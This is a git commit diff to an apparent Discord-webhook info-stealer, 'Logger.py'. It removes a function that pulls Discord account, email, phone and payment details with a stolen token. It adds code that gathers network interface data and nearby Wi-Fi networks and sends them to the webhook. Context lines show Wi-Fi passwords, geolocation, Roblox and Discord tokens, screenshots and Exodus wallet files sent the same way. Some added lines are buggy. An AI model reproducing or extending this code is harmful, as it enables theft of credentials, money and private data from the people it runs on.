aa6edfeb98b8987305561227a7eebd69672bec91
TurtlesXD <116833814+TurtlesXD@users.noreply.github.com>
2023-09-17 11:54:08 +0100

    Update Logger.py

--- Logger.py
+++ Logger.py
@@ -662,164 +662,6 @@ def record_audio(duration=5, freq=44100, channels=2):
     except Exception as e:
         print("Error:", str(e))
 
-def discordinfo():
-    languages = {
-    'da'    : 'Danish, Denmark',
-    'de'    : 'German, Germany',
-    'en-GB' : 'English, United Kingdom',
-    'en-US' : 'English, United States',
-    'es-ES' : 'Spanish, Spain',
-    'fr'    : 'French, France',
-    'hr'    : 'Croatian, Croatia',
-    'lt'    : 'Lithuanian, Lithuania',
-    'hu'    : 'Hungarian, Hungary',
-    'nl'    : 'Dutch, Netherlands',
-    'no'    : 'Norwegian, Norway',
-    'pl'    : 'Polish, Poland',
-    'pt-BR' : 'Portuguese, Brazilian, Brazil',
-    'ro'    : 'Romanian, Romania',
-    'fi'    : 'Finnish, Finland',
-    'sv-SE' : 'Swedish, Sweden',
-    'vi'    : 'Vietnamese, Vietnam',
-    'tr'    : 'Turkish, Turkey',
-    'cs'    : 'Czech, Czechia, Czech Republic',
-    'el'    : 'Greek, Greece',
-    'bg'    : 'Bulgarian, Bulgaria',
-    'ru'    : 'Russian, Russia',
-    'uk'    : 'Ukranian, Ukraine',
-    'th'    : 'Thai, Thailand',
-    'zh-CN' : 'Chinese, China',
-    'ja'    : 'Japanese',
-    'zh-TW' : 'Chinese, Taiwan',
-    'ko'    : 'Korean, Korea'
-    }
-    cc_digits = {
-    'american express': '3',
-    'visa': '4',
-    'mastercard': '5'
-    }
-    token = ''
-
-    try:
-            headers = {
-                'Authorization': token,
-                'Content-Type': 'application/json'
-            }
-
-            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-            res_json = res.json()
-
-            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
-            user_id = res_json['id']
-            avatar_id = res_json['avatar']
-            avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
-            phone_number = res_json['phone']
-            email = res_json['email']
-            mfa_enabled = res_json['mfa_enabled']
-            flags = res_json['flags']
-            locale = res_json['locale']
-            verified = res_json['verified']
-                
-            language = languages.get(locale)
-
-            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
-            has_nitro = False
-            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-            nitro_data = res.json()
-            has_nitro = bool(len(nitro_data) > 0)
-            if has_nitro:
-                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    days_left = abs((d2 - d1).days)
-
-            # billing info
-            billing_info = []
-            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json():
-                    y = x['billing_address']
-                    name = y['name']
-                    address_1 = y['line_1']
-                    address_2 = y['line_2']
-                    city = y['city']
-                    postal_code = y['postal_code']
-                    state = y['state']
-                    country = y['country']
-
-                    if x['type'] == 1:
-                        cc_brand = x['brand']
-                        cc_first = cc_digits.get(cc_brand)
-                        cc_last = x['last_4']
-                        cc_month = str(x['expires_month'])
-                        cc_year = str(x['expires_year'])
-                        
-                        data = {
-                            'Payment Type': 'Credit Card',
-                            'Valid': not x['invalid'],
-                            'CC Holder Name': name,
-                            'CC Brand': cc_brand.title(),
-                            'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
-                            'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
-                            'Address 1': address_1,
-                            'Address 2': address_2 if address_2 else '',
-                            'City': city,
-                            'Postal Code': postal_code,
-                            'State': state if state else '',
-                            'Country': country,
-                            'Default Payment Method': x['default']
-                        }
-
-                    elif x['type'] == 2:
-                        data = {
-                            'Payment Type': 'PayPal',
-                            'Valid': not x['invalid'],
-                            'PayPal Name': name,
-                            'PayPal Email': x['email'],
-                            'Address 1': address_1,
-                            'Address 2': address_2 if address_2 else '',
-                            'City': city,
-                            'Postal Code': postal_code,
-                            'State': state if state else '',
-                            'Country': country,
-                            'Default Payment Method': x['default']
-                        }
-
-            billing_info.append(data)
-    except:
-        pass        
-    
-
-
-    location = wrg.HKEY_LOCAL_MACHINE
-
-    # Define the registry paths
-    GPUpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinSAT"
-    CPUpath = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0"
-    Motherboardpath= r"HARDWARE\DESCRIPTION\System\BIOS"
-    OSpath = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-    OSbuildpath =r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-
-    try:
-        soft1 = wrg.OpenKeyEx(location, GPUpath)
-        soft2 = wrg.OpenKeyEx(location, CPUpath)
-        soft3 = wrg.OpenKeyEx(location, Motherboardpath)
-        soft4 = wrg.OpenKeyEx(location, OSpath)
-
-        GPU = wrg.QueryValueEx(soft1, "PrimaryAdapterString")
-        CPU = wrg.QueryValueEx(soft2, "ProcessorNameString")
-        Motherboard = wrg.QueryValueEx(soft3, "BaseBoardProduct")
-        OSversion= wrg.QueryValueEx(soft4, "ProductName")
-        OSbuild = wrg.QueryValueEx(soft4, "CurrentBuildNumber")
-
-        wrg.CloseKey(soft1)
-        wrg.CloseKey(soft2)
-        wrg.CloseKey(soft3)
-        
-        return CPU[0], GPU[0], Motherboard[0], OSversion[0], OSbuild[0]
-
-    except FileNotFoundError:
-        print("The specified path is not found in the Windows Registry.")
-    except Exception as e:
-        print(f"An error occurred: {e}")    
-
 def steamssfnconfig():
     steam_path = ""
     if os.path.exists(os.environ["PROGRAMFILES(X86)"] + "\\steam"):
@@ -851,6 +693,105 @@ def steamssfnconfig():
         except:
             pass
 steamssfnconfig()
+
+def get_ethernet_interfaces_info():
+    interface_info = []
+    all_interfaces = psutil.net_if_stats()
+    all_addresses = psutil.net_if_addrs()
+
+    for interface, stats in all_interfaces.items():
+        if stats.isup and "eth" in interface.lower():
+            ipv4_address = None
+            ipv6_address = None
+            subnet_mask_ipv4 = None
+            subnet_mask_ipv6 = None
+
+            addresses = all_addresses.get(interface, [])
+
+            for addr in addresses:
+                if addr.family == socket.AF_INET and not ipv4_address:
+                    ipv4_address = addr.address
+                    subnet_mask_ipv4 = addr.netmask
+                elif addr.family == socket.AF_INET6 and not ipv6_address:
+                    ipv6_address = addr.address
+                    subnet_mask_ipv6 = addr.netmask
+
+            interface_data = {
+                "Interface": interface,
+                "MAC Address": addresses[0].address if addresses else None,
+                "Bogon IP Address": ipv4_address,
+                "IPv4 Subnet Mask": subnet_mask_ipv4,
+                "IPv6 Address": ipv6_address,
+                "IPv6 Subnet Mask": subnet_mask_ipv6,
+                "Speed (Mbps)": stats.speed,
+                "Duplex Mode": "Full-Duplex" if stats.duplex == 2 else "Half-Duplex",
+            }
+
+            interface_info.append(interface_data)
+
+    return interface_info
+
+def get_wifi_interfaces_info():
+    interface_info = []
+    all_interfaces = psutil.net_if_stats()
+    all_addresses = psutil.net_if_addrs()
+    
+    for interface, stats in all_interfaces.items():
+        if stats.isup and "wlan" in interface.lower():  # Replace with appropriate prefix
+            ipv4_address = None
+            ipv6_address = None
+            subnet_mask_ipv4 = None
+            subnet_mask_ipv6 = None
+            
+            addresses = all_addresses.get(interface, [])
+            
+            for addr in addresses:
+                if addr.family == socket.AF_INET and not ipv4_address:
+                    ipv4_address = addr.address
+                    subnet_mask_ipv4 = addr.netmask
+                elif addr.family == socket.AF_INET6 and not ipv6_address:
+                    ipv6_address = addr.address
+                    subnet_mask_ipv6 = addr.netmask
+            
+            interface_data = {
+                "Interface": interface,
+                "MAC Address": addresses[0].address if addresses else None,
+                "Bogon IP Address": ipv4_address,
+                "IPv4 Subnet Mask": subnet_mask_ipv4,
+                "IPv6 Address": ipv6_address,
+                "IPv6 Subnet Mask": subnet_mask_ipv6,
+                "Speed (Mbps)": stats.speed,
+                "Duplex Mode": "Full-Duplex" if stats.duplex == 2 else "Half-Duplex",
+            }
+            
+            interface_info.append(interface_data)
+    
+    return interface_info
+
+def get_strongest_wifi_info():
+    wifi_info = []
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]  # Assuming the first interface; adjust as needed
+
+    strongest_signal = -100  # Set to a low initial value
+    strongest_signal_network = None
+
+    for scan_result in iface.scan_results():
+        wifi_data = {
+            "SSID": scan_result.ssid,
+            "BSSID": scan_result.bssid,
+            "Signal Strength (dBm)": scan_result.signal,
+            "Encryption Type": scan_result.akm,
+        }
+        wifi_info.append(wifi_data)
+
+        # Check if the current network has a stronger signal
+        if scan_result.signal > strongest_signal:
+            strongest_signal = scan_result.signal
+            strongest_signal_network = wifi_data
+
+    return strongest_signal_network
+
     
     
    
@@ -905,13 +846,54 @@ if wifi:
     for ssid, password in wifi.items():
         password = f'```{password}```'
         wifi_embed.add_embed_field(name=ssid, value=password)
-    
+	    
+ethernet_interfaces_info = get_ethernet_interfaces_info()
+ethernet_interfaces_embeds = []
+for interface_info in ethernet_interfaces_info:
+    etherembed = DiscordEmbed(title='Ethernet interface(s) info', description='', color='4DBDD0')
+    for item, key in interface_info.items():
+        key=f'```{key}```'
+        etherembed.add_embed_field(name=item, value=str(key))
+    ethernet_interfaces_embeds.append(etherembed)
+
+wifi_info=get_wifi_interfaces_info()
+wifi_embeds=[]
+for interface in wifi_info:
+    wifiembed=DiscordEmbed(title='Wifi interfaces(s) info',color='4DBDD0')
+    for item, key in interface.items():
+        key=f'```{key}```'
+        wifi_embeds.add_embed_field(name=item,value=str(key))
+    wifi_embeds.append(wifiembed)    
 
 webhook.add_embed(sysembed) 
 webhook.add_embed(wifi_embed)
 webhook.add_embed(geolocationembed)
 webhook.add_embed(robloxembed)
 webhook.add_embed(discordtokenembed)
+
+if ethernet_interfaces_embeds:
+    for embed in ethernet_interfaces_embeds:
+        webhook.add_embed(embed)
+else:
+    noetherembed=DiscordEmbed(title='Ethernet interfaces(s) info', description='No ethernet interfaces found',color='4DBDD0')
+    webhook.add_embed(noetherembed) 
+
+if wifi_embeds:
+    for embed in wifi_embeds:
+        webhook.add_embed()
+else:
+    nowifiembed=DiscordEmbed(title='Wifi interfaces(s) info', description='No wifi interfaces found',color='4DBDD0')
+    webhook.add_embed(nowifiembed)  
+
+if get_strongest_wifi_info() is not None:
+    strongwifiembed=DiscordEmbed(title='Strongest/closest Wifi network',description='',color='4DBDD0')
+    for item , key in get_strongest_wifi_info().items():
+        key=f'```{key}```'
+        strongwifiembed.add_embed_field(name=item,value=str(key))
+    webhook.add_embed(strongwifiembed)  
+else:
+    nonetworkembed=DiscordEmbed(title='Strongest/closest Wifi network', description='No Wi-Fi networks within range were found.',color='4DBDD0')
+    webhook.add_embed(nonetworkembed) 
 
 screenie()#screenshots the users screen(s)  
 exo()#get exodus cryptowallet Appdata and adds the zip to webhook
